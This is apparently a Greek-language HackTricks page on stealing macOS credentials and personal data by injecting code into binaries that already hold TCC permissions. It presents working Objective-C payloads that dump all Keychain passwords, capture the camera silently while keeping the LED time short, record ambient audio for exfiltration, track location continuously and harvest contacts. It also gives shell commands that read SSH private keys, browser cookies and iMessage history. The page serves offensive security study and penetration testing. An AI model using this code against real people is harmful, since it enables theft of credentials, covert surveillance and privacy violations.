# macOS Κλοπή Διαπιστευτηρίων & Δεδομένων μέσω Δικαιωμάτων TCC

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

macOS TCC (Transparency, Consent, and Control) προστατεύει την πρόσβαση σε ευαίσθητα δεδομένα χρηστών. Όταν ένας attacker **compromises a binary that already has TCC grants**, κληρονομεί αυτά τα permissions. Αυτή η σελίδα τεκμηριώνει το exploitation potential κάθε TCC permission σχετικού με κλοπή δεδομένων.

> [!WARNING]
> Code injection into a TCC-granted binary (via DYLD injection, dylib hijacking, or task port) **σιωπηλά κληρονομεί όλα τα δικαιώματα TCC**. Δεν υπάρχει επιπλέον prompt ή verification όταν η ίδια διεργασία διαβάζει προστατευμένα δεδομένα.

---

## Ομάδες πρόσβασης Keychain

### Το Έπαθλο

Το macOS Keychain αποθηκεύει:
- **Wi-Fi passwords** — όλα τα αποθηκευμένα credentials ασύρματων δικτύων
- **Website passwords** — κωδικοί για Safari, Chrome (όταν χρησιμοποιείται το Keychain) και άλλους browsers
- **Application passwords** — λογαριασμοί email, VPN credentials, development tokens
- **Certificates and private keys** — code signing, client TLS, S/MIME encryption
- **Secure notes** — μυστικά που αποθηκεύει ο χρήστης

### Entitlement: `keychain-access-groups`

Τα αντικείμενα του Keychain οργανώνονται σε **access groups**. Το entitlement `keychain-access-groups` μιας εφαρμογής απαριθμεί ποιες ομάδες μπορεί να προσπελάσει:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Εκμετάλλευση
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Πρόσβαση στην κάμερα (kTCCServiceCamera)

### Εκμετάλλευση

Ένα binary με παραχώρηση TCC για την κάμερα (μέσω `kTCCServiceCamera` ή `com.apple.security.device.camera` entitlement) μπορεί να καταγράψει φωτογραφίες και βίντεο:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Silent Capture
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> Από την έκδοση **macOS Sonoma**, ο δείκτης κάμερας στη γραμμή μενού είναι μόνιμος και δεν μπορεί να αποκρυφτεί προγραμματιστικά. Σε **παλαιότερες εκδόσεις macOS**, μια σύντομη λήψη μπορεί να μην παράγει εμφανή δείκτη.
 
---

## Πρόσβαση στο μικρόφωνο (kTCCServiceMicrophone)

### Εκμετάλλευση

Η πρόσβαση στο μικρόφωνο καταγράφει όλον τον ήχο από το ενσωματωμένο μικρόφωνο, το headset ή συνδεδεμένες συσκευές εισόδου ήχου:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Επίθεση: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Παρακολούθηση Τοποθεσίας (kTCCServiceLocation)

### Εκμετάλλευση
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Συνεχής Παρακολούθηση
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Επαφές / Ημερολόγιο / Φωτογραφίες

### Εξαγωγή Προσωπικών Δεδομένων

| TCC Service | Πλαίσιο | Δεδομένα |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Ονόματα, διευθύνσεις email, τηλέφωνα, διευθύνσεις |
| `kTCCServiceCalendar` | `EventKit` | Συσκέψεις, συμμετέχοντες, τοποθεσίες |
| `kTCCServicePhotos` | `Photos.framework` | Φωτογραφίες, στιγμιότυπα οθόνης, μεταδεδομένα τοποθεσίας |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Contacts Harvesting
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Πρόσβαση σε λογαριασμό iCloud

### Δικαίωμα: `com.apple.private.icloud-account-access`

Αυτό το δικαίωμα επιτρέπει την επικοινωνία με την υπηρεσία XPC `com.apple.iCloudHelper`, παρέχοντας πρόσβαση σε:
- **iCloud tokens** — διαπιστευτήρια αυθεντικοποίησης για το Apple ID του χρήστη
- **iCloud Drive** — συγχρονισμένα έγγραφα από όλες τις συσκευές
- **iCloud Keychain** — κωδικοί πρόσβασης συγχρονισμένοι σε όλες τις συσκευές Apple
- **Find My** — τοποθεσία όλων των συσκευών Apple του χρήστη
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Η παραβίαση ενός iCloud-entitled binary επεκτείνει την επίθεση από μία **συσκευή σε ολόκληρο το οικοσύστημα Apple**: άλλους Macs, iPhones, iPads, Apple Watch. Ο συγχρονισμός iCloud Keychain σημαίνει ότι οι κωδικοί πρόσβασης από όλες τις συσκευές είναι προσβάσιμοι.

---

## Πλήρης Πρόσβαση στο Δίσκο (kTCCServiceSystemPolicyAllFiles)

### Η πιο ισχυρή άδεια TCC

Η Πλήρης Πρόσβαση στο Δίσκο παρέχει δυνατότητα ανάγνωσης σε **κάθε αρχείο στο σύστημα**, συμπεριλαμβανομένων:
- Δεδομένα άλλων εφαρμογών (Messages, Mail, Safari history)
- Βάσεις δεδομένων TCC (αποκαλύπτοντας όλες τις άλλες άδειες)
- Κλειδιά SSH και ρυθμίσεις
- Cookies προγράμματος περιήγησης και διακριτικά συνεδρίας
- Βάσεις δεδομένων εφαρμογών και cache
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Μήτρα Προτεραιότητας Εκμετάλλευσης

When assessing injectable TCC-granted binaries, prioritize by data value:

| Προτεραιότητα | Άδεια TCC | Γιατί |
|---|---|---|
| **Κρίσιμο** | Full Disk Access | Πρόσβαση σε όλα |
| **Κρίσιμο** | TCC Manager | Μπορεί να χορηγήσει οποιαδήποτε άδεια |
| **Υψηλό** | Keychain Access Groups | Όλοι οι αποθηκευμένοι κωδικοί |
| **Υψηλό** | iCloud Account Access | Συμβιβασμός πολλαπλών συσκευών |
| **Υψηλό** | Input Monitoring (ListenEvent) | Καταγραφή πλήκτρων |
| **Υψηλό** | Accessibility | Έλεγχος GUI, αυτοχορήγηση |
| **Μεσαίο** | Screen Capture | Καταγραφή οπτικών δεδομένων |
| **Μεσαίο** | Camera + Microphone | Παρακολούθηση |
| **Μεσαίο** | Contacts + Calendar | Δεδομένα κοινωνικής μηχανικής |
| **Χαμηλό** | Location | Φυσική παρακολούθηση |
| **Χαμηλό** | Photos | Προσωπικά δεδομένα |

## Σενάριο Ανίχνευσης
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Αναφορές

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../banners/hacktricks-training.md}}
